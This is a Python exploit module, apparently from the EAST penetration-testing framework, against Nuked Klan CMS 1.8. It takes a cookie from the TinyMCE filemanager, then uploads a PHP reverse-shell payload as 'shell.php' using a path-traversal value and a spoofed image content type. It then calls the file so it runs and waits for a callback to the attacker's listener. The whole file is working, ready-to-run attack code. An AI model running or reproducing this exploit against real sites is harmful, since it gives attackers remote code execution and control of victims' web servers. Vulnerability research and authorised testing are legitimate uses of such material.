#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import time
import urllib2
from collections import OrderedDict

sys.path.append('./core')
sys.path.append('./shellcodes')
import ShellUtils
import Shellcodes
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_nuked_klan_cms_fu"
INFO['DESCRIPTION'] = "Nuked Klan CMS 1.8 File Upload"
INFO['VENDOR'] = "https://github.com/Nuked-Klan/CMS_Nuked-Klan"
INFO['DOWNLOAD_LINK'] = 'https://github.com/Nuked-Klan/CMS_Nuked-Klan/archive/develop_1.8.zip'
INFO['LINKS'] = ['https://packetstormsecurity.com/files/140403/Nuked-Klan-CMS-1.8-File-Upload.html']
INFO["CVE Name"] = "?"
INFO["NOTES"] = """Unauthenticated Unrestricted File Upload"""

INFO['CHANGELOG'] = "13 Jan, 2016. Written by Gleg team."
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = 80, dict(description = 'Target port')
OPTIONS["BASEPATH"] = '/CMS_Nuked-Klan-develop_1.8', dict(description = 'Basepath')
OPTIONS["CALLBACK_IP"] = "127.0.0.1", dict(description = 'Callback IP')


class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        self.basepath = OPTIONS["BASEPATH"]
        self.callback_ip = ''
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.basepath = self.args.get('BASEPATH', self.basepath)
        self.callback_ip = self.args.get('CALLBACK_IP', OPTIONS["CALLBACK_IP"])
    
    def make_url(self, path = ''):
        return 'http://{}:{}{}{}'.format(self.host, self.port, self.basepath, path)
    
    def make_sploit(self):
        self.log("[>] Generate shellcode started")
        
        if self.args['listener']:
            port = self.args['listener']['PORT']
        else:
            return None

        s = Shellcodes.CrossOSShellcodes(self.callback_ip, port)
        shellcode = s.create_shellcode(ShellUtils.Constants.ShellcodeType.PHP, True)

        self.log("[>] Shellcode ready")
        return shellcode
        
    def make_data(self, content):
        data = '--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="path"\r\n\r\n'
        data += '../../../../'
        data += '\r\n--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="path_thumb"\r\n\r\n'
        data += 'thumbs/'
        data += '\r\n--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n'
        data += 'Content-Type: image/png\r\n\r\n'
        data += content
        data += '\r\n--o0oOo0o--\r\n'
        
        return data
    
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        if self.is_listener_connected() is None:
            self.log('Please, enable listener to use this module')
            self.finish(False)
            
        fd = urllib2.urlopen(self.make_url('/media/tinymce/plugins/filemanager/dialog.php'))
        cookie = fd.headers['set-cookie']
        self.log('Cookies: ' + cookie)
        
        data = self.make_data(self.make_sploit()[1:])
        request = urllib2.Request(self.make_url('/media/tinymce/plugins/filemanager/upload.php'), data)
        request.add_header('Content-Length', len(data))
        request.add_header('Content-Type', 'multipart/form-data; boundary=o0oOo0o')
        request.add_header('X-File-Name', 'shell.php')
        request.add_header('X-Requested-With', 'XMLHttpRequest')
        request.add_header('Cookie', cookie)
        
        self.log('Uploading shell.php')
        try:
            fd = urllib2.urlopen(request)
            self.log(fd.read())
        except Exception as e:
            self.log(e)
            self.finish(False)
        
        self.log('All files uploaded. Execute shell.php ...')
        try:
            urllib2.urlopen(self.make_url('/shell.php'), timeout=3)
        except Exception as e:
            pass
        while True:
            if self.is_listener_connected():
                break
            time.sleep(3)
        
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
